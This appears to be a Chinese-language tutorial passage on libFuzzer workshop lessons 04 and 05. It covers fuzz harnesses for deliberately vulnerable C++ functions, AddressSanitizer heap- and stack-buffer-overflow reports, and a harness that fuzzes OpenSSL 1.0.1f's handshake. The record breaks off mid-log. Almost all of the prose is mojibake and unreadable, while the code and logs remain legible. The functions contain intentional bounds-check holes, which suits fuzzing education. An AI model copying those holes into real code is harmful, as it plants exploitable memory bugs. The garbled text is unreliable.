cc==9875==ABORTINGMS: 1 EraseBytes-; base unit: aea2e3923af219a8956f626558ef32f30a914ebc0x46,0x55,0x5a,FUZartifact_prefix='./'; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60Base64: RlVa éœ€è¦æ³¨æ„çš„åœ°æ–¹æœ‰ç‚¹å¤š:å‰é¢çš„å‡ è¡Œè¾“å‡ºfuzzerç›¸å…³çš„é€‰é¡¹å’Œé…ç½®ä¿¡æ¯ã€‚seed=2222548757æ˜¯ç”Ÿæˆçš„éšæœºæ•°ç§å­ï¼Œå¯ä»¥åˆ©ç”¨./first_fuzzer -seed=2222548757æŒ‡å®šéšæœºç§å­ã€‚-max_lenä¸ºæµ‹è¯•è¾“å…¥çš„æœ€å¤§é•¿åº¦ ä»¥#å¼€å¤´çš„è¡¨ç¤ºåœ¨fuzzçš„è¿‡ç¨‹ä¸­è¦†ç›–çš„è·¯å¾„ä¿¡æ¯ã€‚INITED fuzzerå·²å®Œæˆåˆå§‹åŒ–ï¼Œå…¶ä¸­åŒ…æ‹¬é€šè¿‡è¢«æµ‹ä»£ç è¿è¡Œæ¯ä¸ªåˆå§‹è¾“å…¥æ ·æœ¬ã€‚READ fuzzerå·²ä»è¯­æ–™åº“ç›®å½•ä¸­è¯»å–äº†æ‰€æœ‰æä¾›çš„è¾“å…¥æ ·æœ¬ã€‚NEW fuzzeråˆ›å»ºäº†ä¸€ä¸ªæµ‹è¯•è¾“å…¥ï¼Œè¯¥è¾“å…¥æ¶µç›–äº†è¢«æµ‹ä»£ç çš„æ–°åŒºåŸŸã€‚æ­¤è¾“å…¥å°†ä¿å­˜åˆ°ä¸»è¦è¯­æ–™åº“ç›®å½•ã€‚pulse fuzzerå·²ç”Ÿæˆ 2çš„næ¬¡æ–¹ä¸ªè¾“å…¥ï¼ˆå®šæœŸç”Ÿæˆä»¥ä½¿ç”¨æˆ·ç¡®ä¿¡fuzzerä»åœ¨å·¥ä½œï¼‰ã€‚REDUCE fuzzerå‘ç°äº†ä¸€ä¸ªæ›´å¥½ï¼ˆæ›´å°ï¼‰çš„è¾“å…¥ï¼Œå¯ä»¥è§¦å‘å…ˆå‰å‘ç°çš„ç‰¹å¾ï¼ˆè®¾ç½®-reduce_inputs=0ä»¥ç¦ç”¨ï¼‰ã€‚cov æ‰§è¡Œå½“å‰è¯­æ–™åº“æ‰€è¦†ç›–çš„ä»£ç å—æˆ–è¾¹çš„æ€»æ•°ã€‚ft libFuzzerä½¿ç”¨ä¸åŒçš„ä¿¡å·æ¥è¯„ä¼°ä»£ç è¦†ç›–ç‡ï¼šè¾¹ç¼˜è¦†ç›–ç‡ï¼Œè¾¹ç¼˜è®¡æ•°å™¨ï¼Œå€¼é…ç½®æ–‡ä»¶ï¼Œé—´æ¥è°ƒç”¨æ–¹/è¢«è°ƒç”¨æ–¹å¯¹ç­‰ã€‚è¿™äº›ç»„åˆçš„ä¿¡å·ç§°ä¸ºåŠŸèƒ½ï¼ˆftï¼šï¼‰ã€‚corp å½“å‰å†…å­˜ä¸­æµ‹è¯•è¯­æ–™åº“ä¸­çš„æ¡ç›®æ•°åŠå…¶å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚exec/s æ¯ç§’æ¨¡ç³Šå™¨è¿­ä»£çš„æ¬¡æ•°ã€‚rss å½“å‰çš„å†…å­˜æ¶ˆè€—ã€‚L æ–°è¾“å…¥çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚MSï¼š&lt;n&gt; &lt;æ“ä½œ&gt; è®¡æ•°å’Œç”¨äºç”Ÿæˆè¾“å…¥çš„å˜å¼‚æ“ä½œåˆ—è¡¨ #17458 REDUCE cov: 7 ft: 7 corp: 5/14b lim: 170 exec/s: 0 rss: 29Mb L: 4/4 MS: 1 EraseBytes-æŒ‡å°è¯•äº†17458ä¸ªè¾“å…¥ï¼ŒæˆåŠŸå‘ç°äº†5ä¸ªæ ·æœ¬ï¼ˆæ”¾å…¥è¯­æ–™åº“ï¼‰å¤§å°ä¸º14bï¼Œå…±è¦†ç›–äº†7ä¸ªä»£ç å—ï¼Œå ç”¨å†…å­˜29mbï¼Œå˜å¼‚æ“ä½œä¸ºEraseBytes-ã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¼‚å¸¸æ£€æµ‹ç›¸å…³çš„ä¿¡æ¯ï¼š 12==9875==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005a1d3 at pc 0x00000059b461 bp 0x7ffd79c84880 sp 0x7ffd79c84878READ of size 1 at 0x60200005a1d3 thread T0 å¯ä»¥çœ‹åˆ°AddressSanitizeræ£€æµ‹åˆ°å…¶ä¸­çš„ä¸€ä¸ªè¾“å…¥è§¦å‘äº†å †æº¢å‡ºï¼ˆheap-buffer-overflowï¼‰çš„æ¼æ´ã€‚æ›´æ®é”™è¯¯ä¿¡æ¯ä¸­çš„ #0 0x59b460 in VulnerableFunction1(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14å¯ä»¥çœ‹åˆ°é”™è¯¯ç‚¹åœ¨vulnerable_functions.h:22:14ï¼Œå¯¹åº” data[3] == 'Z';å³æ•°ç»„è¶Šç•Œçš„ä½ç½®ã€‚ä¸‹é¢çš„SUMMARYä¹Ÿä¸ä¹‹å¯¹åº”ã€‚ å€’æ•°ç¬¬äºŒè¡Œç»™å‡ºäº†é€ æˆcrashçš„è¾“å…¥ï¼Œå¹¶å°†å…¶å†™å…¥äº†crash-0eb8e4ed029b774d80f2b66408203801cb982a60ã€‚å¤ç°crashå¯æ‰§è¡Œ./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60ã€‚ è¿™æ ·fuzz tesingåŸºæœ¬ä¸Šå·²ç»å®Œæˆäº†ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªé€ æˆç¨‹åºcrashçš„è¾“å…¥ï¼Œå¹¶å¾—çŸ¥å­˜åœ¨å †æº¢å‡ºçš„æ¼æ´ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æœ‰é’ˆå¯¹æ€§çš„å¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œåˆ©ç”¨é€ æˆcrashçš„è¾“å…¥å›æº¯å‡ºæ¼æ´çš„ç»†èŠ‚ã€‚ ç»§ç»­fuzzå‡½æ•°VulnerableFunction2 123456789101112131415161718192021222324252627constexpr auto kMagicHeader = &quot;ZN_2016&quot;;constexpr std::size_t kMaxPacketLen = 1024;constexpr std::size_t kMaxBodyLength = 1024 - sizeof(kMagicHeader);bool VulnerableFunction2(const uint8_t* data, size_t size, bool verify_hash) { if (size &lt; sizeof(kMagicHeader)) return false; std::string header(reinterpret_cast&lt;const char*&gt;(data), sizeof(kMagicHeader)); std::array&lt;uint8_t, kMaxBodyLength&gt; body; if (strcmp(kMagicHeader, header.c_str())) return false; auto target_hash = data[--size]; if (size &gt; kMaxPacketLen) return false; if (!verify_hash) return true; std::copy(data, data + size, body.data()); auto real_hash = DummyHash(body); return real_hash == target_hash;} è¯¥å‡½æ•°å¤šäº†ä¸€ä¸ªboolå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬çš„çš„æ¥å£å‡½æ•°è¦æœ‰æ‰€æ”¹åŠ¨ï¼š 1234567891011#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &quot;vulnerable_functions.h&quot;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { bool verify_hash_flags[] = {true, false}; for(auto flag : verify_hash_flags) VulnerableFunction2(data, size, flag); return 0;} ä¸ºäº†æé«˜fuzzå‡ºcrashçš„æ¦‚ç‡ï¼Œæˆ‘ä»¬è¦åˆ†åˆ«fuzz flagä¸ºtrueå’Œfalseçš„è¯·å†µï¼Œè€Œä¸åº”è¯¥æŠŠflagå†™æ­»ã€‚æ¥ç€ç¼–è¯‘å¹¶æ‰§è¡Œå¾—åˆ°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778INFO: Seed: 296692635INFO: Loaded 1 modules (37 inline 8-bit counters): 37 [0x7f8160, 0x7f8185), INFO: Loaded 1 PC tables (37 PCs): 37 [0x5b7d00,0x5b7f50), INFO: 0 files found in corpus2INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 5 ft: 6 corp: 1/1b exec/s: 0 rss: 27Mb#414 NEW cov: 6 ft: 7 corp: 2/9b lim: 8 exec/s: 0 rss: 27Mb L: 8/8 MS: 2 ChangeByte-CrossOver- NEW_FUNC[1/13]: 0x59bab0 in unsigned char* std::copy&lt;unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:447 NEW_FUNC[2/13]: 0x59bb40 in std::array&lt;unsigned char, 1016ul&gt;::data() /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/array:235#584 NEW cov: 24 ft: 26 corp: 3/17b lim: 8 exec/s: 0 rss: 28Mb L: 8/8 MS: 5 CopyPart-CopyPart-ShuffleBytes-CrossOver-CMP- DE: &quot;ZN_2016&quot;-#105505 NEW cov: 25 ft: 27 corp: 4/1067b lim: 1050 exec/s: 0 rss: 47Mb L: 1050/1050 MS: 1 CrossOver-#106508 REDUCE cov: 25 ft: 27 corp: 4/1046b lim: 1050 exec/s: 0 rss: 48Mb L: 1029/1029 MS: 3 EraseBytes-ChangeBit-CopyPart-#108257 REDUCE cov: 25 ft: 27 corp: 4/1043b lim: 1060 exec/s: 0 rss: 49Mb L: 1026/1026 MS: 4 ChangeByte-ChangeByte-CrossOver-InsertRepeatedBytes-===================================================================10468==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff31422548 at pc 0x00000055286d bp 0x7fff31421f90 sp 0x7fff31421740WRITE of size 1023 at 0x7fff31422548 thread T0 #0 0x55286c in __asan_memmove /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:30 #1 0x59c238 in unsigned char* std::__copy_move&lt;false, true, std::random_access_iterator_tag&gt;::__copy_m&lt;unsigned char&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:368:6 #2 0x59c158 in unsigned char* std::__copy_move_a&lt;false, unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:385:14 #3 0x59c0b6 in unsigned char* std::__copy_move_a2&lt;false, unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:422:18 #4 0x59bb39 in unsigned char* std::copy&lt;unsigned char const*, unsigned char*&gt;(unsigned char const*, unsigned char const*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/stl_algobase.h:454:15 #5 0x59b8b5 in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:61:3 #6 0x59bf63 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/04/second_fuzzer.cc:12:2 #7 0x466186 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #8 0x46b7e9 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #9 0x46b7e9 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #10 0x46e80f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #11 0x456b99 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #12 0x41f522 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #13 0x7fd1b4bf6bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #14 0x41f599 in _start (/home/admin/libfuzzer-workshop/lessons/04/second_fuzzer+0x41f599)Address 0x7fff31422548 is located in stack of thread T0 at offset 1128 in frame #0 0x59b4af in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:42 This frame has 3 object(s): [32, 64) 'header' (line 46) [96, 97) 'ref.tmp' (line 46) [112, 1128) 'body' (line 48) &lt;== Memory access at offset 1128 overflows this variableHINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork (longjmp and C++ exceptions *are* supported)SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:30 in __asan_memmoveShadow bytes around the buggy address: 0x10006627c450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x10006627c4a0: 00 00 00 00 00 00 00 00 00[f3]f3 f3 f3 f3 f3 f3 0x10006627c4b0: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 0x10006627c4c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c4d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10006627c4e0: 00 00 00 00 f1 f1 f1 f1 02 f3 f3 f3 00 00 00 00 0x10006627c4f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc==10468==ABORTINGMS: 4 ChangeBinInt-CrossOver-ChangeByte-EraseBytes-; base unit: e63bf1b07c6950248bb14fe74c3a84f06c711b15artifact_prefix='./'; Test unit written to ./crash-a42cbe2ff7331f281ef213e54919e8cd932883bd ç›¸ä¿¡å¤§å®¶å·²ç»ä¸å†é™Œç”Ÿäº†ï¼Œå®šä½é”™è¯¯ä½äº#5 0x59b8b5 in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:61:3å³ std::copy(data, data + size, body.data());ï¼Œè¯¥å¥é€ æˆäº†stack_overflowï¼ŒåŸå› åœ¨äºvectorç±»å‹çš„bodyçš„å¤§å°ä¸º1024 - sizeof(kMagicHeader)ï¼Œè€Œåœ¨copyæ—¶çš„dataçš„sizeçš„é™åˆ¶æ¡ä»¶æ˜¯size &gt; kMaxPacketLen(1024)ï¼Œä»è€Œé€ æˆäº†ç¼“å†²åŒºæº¢å‡ºã€‚ å¦‚æœæˆ‘ä»¬å†™æ­»flagä¸ºfalseçš„è¯å°±å¯èƒ½ä¼šè·‘å¾ˆä¹…ï¼Œä¹Ÿè·‘ä¸å‡ºæ¥crashã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨å¥—ç”¨æ¨¡æ¿æ—¶è¦ç»“åˆå‡½æ•°çš„é€»è¾‘ï¼Œä½¿å¾—fuzzçš„æ¥å£è®¾è®¡çš„æ›´åŠ åˆç†ï¼Œä»è€Œå¢åŠ fuzzçš„æ•ˆç‡ã€‚ ç»§ç»­ç»§ç»­VulnerableFunction3: 123456constexpr std::size_t kZn2016VerifyHashFlag = 0x0001000;bool VulnerableFunction3(const uint8_t* data, size_t size, std::size_t flags) { bool verify_hash = flags &amp; kZn2016VerifyHashFlag; return VulnerableFunction2(data, size, verify_hash);} å¯ä»¥çœ‹åˆ°ï¼Œä¸2ä¸åŒçš„åœ°æ–¹å°±æ˜¯å¯¹flagè¿›è¡Œäº†&amp; kZn2016VerifyHashFlagçš„è®¡ç®—ï¼Œè¿™ç§å…¶å®æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºä½¿å¾—flags &amp; kZn2016VerifyHashFlagä¸ºtrue/falseçš„è¾“å…¥ï¼Œå¹¶æ¨¡ä»¿second_fuzzeré‚£æ ·å†™ä¸ªå¾ªç¯ï¼Œè¿™æ ·å°±å’Œ2æ²¡å·®äº†ã€‚ä½†è¿™é‡Œworkshopæä¾›äº†ä¸€ä¸ªä¸åŒçš„æ–¹æ³•ï¼šIn this case, we can get some randomization of flags values using data provided by libFuzzer: 12345678910111213141516#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &quot;vulnerable_functions.h&quot;#include &lt;functional&gt;#include &lt;string&gt;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { std::string data_string(reinterpret_cast&lt;const char*&gt;(data), size); auto data_hash = std::hash&lt;std::string&gt;()(data_string); std::size_t flags = static_cast&lt;size_t&gt;(data_hash); VulnerableFunction3(data, size, flags); return 0;} é‡‡ç”¨äº†libfuzzeræä¾›çš„éšæœºåŒ–æ–¹æ³•ä½¿å¾—æˆ‘ä»¬çš„è¾“å…¥flagä¸ºéšæœºæ•°ï¼Œä»è€Œflags &amp; kZn2016VerifyHashFlagçš„ç»“æœä¹ŸéšæœºåŒ–ã€‚åœ¨æ¬¡æ•°è¶³å¤Ÿå¤šçš„æƒ…å†µä¸‹falseå’Œtrueçš„æƒ…å†µå°†è¶‹äºåŒä¸º50%ã€‚ æ¥ä¸‹æ¥çœ‹lesson05ï¼šè¿™æ¬¡çš„ç›®æ ‡å’Œlesson04æœ‰æ‰€ä¸åŒï¼Œlesson04ä¸­æˆ‘ä»¬é’ˆå¯¹.hå‡½æ•°åº“ä¸­çš„å‡½æ•°è¿›è¡Œfuzzï¼Œè€Œlibfuzzerçš„å¨åŠ›è¿œä¸æ­¢äºæ­¤ï¼Œå®ƒè¿˜å¯ä»¥å¯¹å¤§å‹å¼€æºåº“è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚åœ¨æºç ç¼–è¯‘å¼€æºåº“æ—¶é€‰æ‹©åˆé€‚çš„é€‰é¡¹ä»¥åŠå°†libfuzzerä¸å¼€æºåº“é“¾æ¥åœ¨ä¸€èµ·ä»¥è¿›è¡Œfuzzï¼Œè¿™äº›ç»†èŠ‚å°†åœ¨è¯¥lesson05ä½“ç°ã€‚ é¦–å…ˆè§£åŒ…tar xzf openssl1.0.1f.tgzã€‚æ¥ç€æ‰§è¡Œ./configç”Ÿæˆmakefileã€‚ä¹‹åï¼š 12make cleanmake CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot; -j$(nproc) ç¬¬äºŒæ¡æŒ‡ä»¤å…¶å®å¹¶ä¸å¤ªè§„èŒƒï¼Œå°†ç¼–è¾‘å™¨ä»¥å¤–çš„å…¶ä»–å‚æ•°ä¹Ÿä¸€è‚¡è„‘å†™åˆ°CCå˜é‡é‡Œäº†ã€‚clangåçš„å‚æ•°æœ¬åº”è¯¥æ˜¯ç”±CFLAGSæˆ–CXXFLAGSæŒ‡å®šçš„ã€‚è§£é‡Šä¸€ä¸‹é€‰é¡¹ï¼š 1234-02 æŒ‡å®šä¼˜å…ˆçº§åˆ«-g å¸¦æœ‰è°ƒè¯•ç¬¦å·æ¥ç¼–è¯‘-fno-omit-frame-pointer å¯¹äºä¸éœ€è¦æ ˆæŒ‡é’ˆçš„å‡½æ•°å°±ä¸åœ¨å¯„å­˜å™¨ä¸­ä¿å­˜æŒ‡é’ˆï¼Œå› æ­¤å¯ä»¥å¿½ç•¥å­˜å‚¨å’Œæ£€ç´¢åœ°å€çš„ä»£ç ï¼ŒåŒæ—¶å¯¹è®¸å¤šå‡½æ•°æä¾›ä¸€ä¸ªé¢å¤–çš„å¯„å­˜å™¨ã€‚æ‰€æœ‰â€-Oâ€çº§åˆ«éƒ½æ‰“å¼€å®ƒï¼Œä½†ä»…åœ¨è°ƒè¯•å™¨å¯ä»¥ä¸ä¾é æ ˆæŒ‡é’ˆè¿è¡Œæ—¶æ‰æœ‰æ•ˆã€‚åœ¨AMD64å¹³å°ä¸Šæ­¤é€‰é¡¹é»˜è®¤æ‰“å¼€ï¼Œä½†æ˜¯åœ¨x86å¹³å°ä¸Šåˆ™é»˜è®¤å…³é—­ã€‚å»ºè®®æ˜¾å¼çš„è®¾ç½®å®ƒã€‚-fsanitize æŒ‡å®šsanitize è¿™äº›å‚æ•°çš„æŒ‡å®šæ˜¯è‡³å…³é‡è¦çš„ï¼Œå®ƒä¼šå½±å“åˆ°ä¹‹åå¼€æºåº“ä¸libfuzzerçš„é“¾æ¥ä»¥åŠfuzzçš„æ•ˆç‡ã€‚å¦‚æœä¸è®¾ç½®è¿™äº›ç¼–è¯‘é€‰é¡¹ç›´æ¥makeçš„è¯fuzzçš„æ•ˆç‡å¦‚ä¸‹ï¼š 123456789101112âœ 05 git:(master) âœ— ./openssl_fuzzer2INFO: Seed: 1865248494INFO: Loaded 1 modules (10 inline 8-bit counters): 10 [0x96c950, 0x96c95a), INFO: Loaded 1 PC tables (10 PCs): 10 [0x6d56d0,0x6d5770), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 2 ft: 3 corp: 1/1b exec/s: 0 rss: 29Mb#131072 pulse cov: 2 ft: 3 corp: 1/1b lim: 1300 exec/s: 43690 rss: 388Mb#262144 pulse cov: 2 ft: 3 corp: 1/1b lim: 2611 exec/s: 43690 rss: 397Mb#524288 pulse cov: 2 ft: 3 corp: 1/1b lim: 4096 exec/s: 37449 rss: 411Mb#1048576 pulse cov: 2 ft: 3 corp: 1/1b lim: 4096 exec/s: 34952 rss: 411Mb#2097152 pulse cov: 2 ft: 3 corp: 1/1b lim: 4096 exec/s: 32768 rss: 411Mb è¿™è·¯å¾„è¦†ç›–ç‡å¤ªæ„Ÿäººï¼Œå…¶ä¸­çš„é‡è¦åŸå› å°±åœ¨äºç¼–è¯‘å¼€æºåº“æ—¶çš„é€‰é¡¹è®¾ç½®ã€‚è®¾ç½®ç¼–è¯‘é€‰é¡¹åçš„fuzzæ•ˆæœï¼š 123456789101112131415161718192021INFO: Seed: 2565779026INFO: Loaded 1 modules (35878 inline 8-bit counters): 35878 [0xcd8590, 0xce11b6), INFO: Loaded 1 PC tables (35878 PCs): 35878 [0x954da8,0x9e1008), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 410 ft: 411 corp: 1/1b exec/s: 0 rss: 36Mb#112 NEW cov: 413 ft: 416 corp: 2/2b lim: 4 exec/s: 0 rss: 42Mb L: 1/1 MS: 5 ChangeBit-ChangeBinInt-ChangeByte-InsertByte-EraseBytes- NEW_FUNC[1/1]: 0x65f0a0 in ERR_put_error /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/crypto/err/err.c:708#319 NEW cov: 420 ft: 448 corp: 3/8b lim: 6 exec/s: 0 rss: 51Mb L: 6/6 MS: 2 ShuffleBytes-CrossOver-#327 REDUCE cov: 420 ft: 448 corp: 3/7b lim: 6 exec/s: 0 rss: 51Mb L: 5/5 MS: 3 ChangeByte-EraseBytes-CrossOver- NEW_FUNC[1/2]: 0x562a40 in tls1_enc /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_enc.c:685 NEW_FUNC[2/2]: 0x67e1d0 in EVP_MD_CTX_md /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/crypto/evp/evp_lib.c:282#454 REDUCE cov: 431 ft: 467 corp: 4/12b lim: 6 exec/s: 0 rss: 57Mb L: 5/5 MS: 2 ShuffleBytes-CMP- DE: &quot;\\xfd\\x03\\x00\\x00&quot;- NEW_FUNC[1/6]: 0x5663d0 in tls1_alert_code /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_enc.c:1214 NEW_FUNC[2/6]: 0x5c6560 in do_ssl3_write /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/s3_pkt.c:634#470 NEW cov: 465 ft: 514 corp: 5/17b lim: 6 exec/s: 0 rss: 58Mb L: 5/5 MS: 1 ChangeByte-#472 REDUCE cov: 465 ft: 521 corp: 6/23b lim: 6 exec/s: 0 rss: 58Mb L: 6/6 MS: 2 CrossOver-CrossOver-#475 NEW cov: 467 ft: 523 corp: 7/28b lim: 6 exec/s: 0 rss: 58Mb L: 5/6 MS: 3 PersAutoDict-ChangeByte-ShuffleBytes- DE: &quot;\\xfd\\x03\\x00\\x00&quot;-#1025 NEW cov: 467 ft: 526 corp: 8/39b lim: 11 exec/s: 0 rss: 81Mb L: 11/11 MS: 5 CopyPart-ShuffleBytes-CrossOver-ShuffleBytes-ChangeBinInt-#1097 NEW cov: 474 ft: 549 corp: 9/49b lim: 11 exec/s: 0 rss: 84Mb L: 10/11 MS: 2 ChangeBit-CopyPart-#1293 REDUCE cov: 474 ft: 549 corp: 9/48b lim: 11 exec/s: 0 rss: 92Mb L: 10/10 MS: 1 EraseBytes- é€‰æ‹©åˆé€‚çš„ç¼–è¯‘å™¨å’Œç¼–è¯‘é€‰é¡¹ï¼Œå®Œæˆå¯¹è¯¥åº“çš„æºç ç¼–è¯‘ï¼Œç”Ÿæˆ.aæ–‡ä»¶ã€‚æ¥ä¸‹æ¥å°±è¦ç ”ç©¶ç¼–å†™fuzzeræ¥å£å‡½æ•°äº†ã€‚workshopæä¾›äº†openssl_fuzzer.ccï¼š 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;openssl/ssl.h&gt;#include &lt;openssl/err.h&gt;#include &lt;assert.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#ifndef CERT_PATH# define CERT_PATH#endifSSL_CTX *Init() { SSL_library_init(); SSL_load_error_strings(); ERR_load_BIO_strings(); OpenSSL_add_all_algorithms(); SSL_CTX *sctx; assert (sctx = SSL_CTX_new(TLSv1_method())); /* These two file were created with this command: openssl req -x509 -newkey rsa:512 -keyout server.key \\ -out server.pem -days 9999 -nodes -subj /CN=a/ */ assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH &quot;server.pem&quot;, SSL_FILETYPE_PEM)); assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH &quot;server.key&quot;, SSL_FILETYPE_PEM)); return sctx;}extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { static SSL_CTX *sctx = Init(); SSL *server = SSL_new(sctx); BIO *sinbio = BIO_new(BIO_s_mem()); BIO *soutbio = BIO_new(BIO_s_mem()); SSL_set_bio(server, sinbio, soutbio); SSL_set_accept_state(server); BIO_write(sinbio, Data, Size); SSL_do_handshake(server); SSL_free(server); return 0;} è¿™é‡Œå°±æ¶‰åŠåˆ°opensslåº“æä¾›çš„ç›¸å…³æ–¹æ³•äº†ï¼Œæœ¬ç¯‡ä¸»è¦è®²è§£fuzzç›¸å…³ï¼Œå°±ä¸ç»†è®²openssläº†ã€‚æ€»ä¹‹å°±æ˜¯è¦å…ˆææ¸…æ¥šopensslçš„ç”¨æ³•ï¼Œå†é€šè¿‡include opensslæä¾›çš„å‡½æ•°æ¥å¯¹opensslè¿›è¡Œfuzzã€‚ç¼–è¯‘å¦‚ä¸‹ï¼š 123clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \\ -I openssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \\ ../../libFuzzer/Fuzz/libFuzzer.a -o openssl_fuzzer -IæŒ‡å®šinlcudeçš„æœç´¢è·¯å¾„ï¼ŒåŒæ—¶é“¾æ¥é™æ€åº“libcrypto.aå’ŒlibFuzzer.aä»¥ä½¿ç”¨åº“ä¸­çš„å‡½æ•°ã€‚ è¿è¡Œè·‘å‡ºcrash: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#24646 REDUCE cov: 611 ft: 889 corp: 50/1105b lim: 116 exec/s: 24646 rss: 382Mb L: 64/77 MS: 5 InsertRepeatedBytes-PersAutoDict-InsertByte-ShuffleBytes-ChangeBit- DE: &quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x04&quot;-#25193 REDUCE cov: 611 ft: 889 corp: 50/1097b lim: 116 exec/s: 25193 